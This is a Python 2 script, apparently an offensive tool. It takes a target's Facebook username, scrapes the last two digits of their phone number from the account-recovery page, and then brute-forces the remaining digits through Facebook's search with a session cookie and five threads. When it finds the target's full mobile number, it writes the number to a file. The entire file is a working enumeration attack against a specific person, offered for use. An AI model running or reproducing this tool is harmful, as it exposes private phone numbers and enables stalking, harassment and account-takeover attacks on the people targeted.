import urllib2
import re
import threading
import sys

 
manual_cookie = raw_input("Get Cookie From https://m.facebook.com/login/identify?ctx=recover After Submitting Your Target: ");
user = raw_input("Username: ")
a = urllib2.build_opener()
a.addheaders.append(('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'))
a.addheaders.append(('Cookie',manual_cookie))
cop = a.open("http://m.facebook.com/login/identify?ctx=recover","ctx=recover&email="+user).read()
lasttwonumbers = re.findall('<ul style="margin:0px"><li>(.*?)</li></ul>',cop)
print "Last 2 #s of Target's Phone: "+lasttwonumbers[0][-2:]

cc = raw_input("Country Code: ")
nb_bt = raw_input("#s Between Country Code & Last 2 #s: ")

file_save = open('out.txt','a')
opener = urllib2.build_opener()
url = 'http://www.facebook.com/search/more?q=%2B'
zeroz = 0
manual_cookie = raw_input("Logged in Full Facebook Cookie: ")
print "[+] Threads are Set To Default To 5\n[+] Bruting Started"


def brute(manual_cookie,number):
   page = url + number
   opener.addheaders.append(('Cookie', manual_cookie))
   get = opener.open(page)
   html = get.read()
   acc = re.findall('<div class="_zs fwb" data-bt="&#123;&quot;ct&quot;:&quot;title&quot;&#125;"><a .*>(.*)<span class="_138">.*</span></a><span class="_5dgp">.*</span></div>', html)
   accc = re.findall('<div class="_zs fwb" data-bt="&#123;&quot;ct&quot;:&quot;title&quot;&#125;"><a .*>(.*)</a><span class="_5dgp">.*</span></div>', html)
   if acc:
      if re.findall(user, html):
         print "\nTarget's Mobile #:\n[+] " + acc[0] + " => +" + str(number) + "\n"
         file_save.write("\nTarget's Mobile #:\n[+] " + acc[0] + " => +" + str(number) + "\n\n\n")         
         print "Good Luck"
         sys.exit()
      else:
         print "[+] " + acc[0] + " => +" + str(number)
         file_save.write("[+] " + acc[0] + " => +" + str(number) + "\n")
   elif accc:
      if re.findall(user, html):
         print "\nTarget's Mobile #:\n[+] " + accc[0] + " => +" + str(number) + "\n"
         file_save.write("\nTarget's Mobile #:\n[+] " + accc[0] + " => +" + str(number) + "\n\n\n")         
         print "Good Luck"
         sys.exit()
      else:
         print "[+] " + accc[0] + " => +" + str(number)
         file_save.write("[+] " + accc[0] + " => +" + str(number) + "\n")

   else:
      print "[-] => +" + str(number)
      
   
while int(len(str(zeroz))) < int(nb_bt)+1:
   number = str(cc)+str('%0*d' % (int(nb_bt), zeroz))+str(lasttwonumbers[0][-2:])
   t=threading.Thread(target=brute,args=(manual_cookie,number,))
   number = str(cc)+str('%0*d' % (int(nb_bt), zeroz+1))+str(lasttwonumbers[0][-2:])
   to=threading.Thread(target=brute,args=(manual_cookie,number,))
   number = str(cc)+str('%0*d' % (int(nb_bt), zeroz+2))+str(lasttwonumbers[0][-2:])
   tt=threading.Thread(target=brute,args=(manual_cookie,number,))
   number = str(cc)+str('%0*d' % (int(nb_bt), zeroz+3))+str(lasttwonumbers[0][-2:])
   tth=threading.Thread(target=brute,args=(manual_cookie,number,))
   number = str(cc)+str('%0*d' % (int(nb_bt), zeroz+4))+str(lasttwonumbers[0][-2:])
   tf=threading.Thread(target=brute,args=(manual_cookie,number,))
   t.start()
   to.start()
   tt.start()
   tth.start()
   tf.start()
   t.join()
   to.join()
   tt.join()
   tth.join()
   tf.join()
   zeroz += 5
   while 1:
      break


file_save.close()
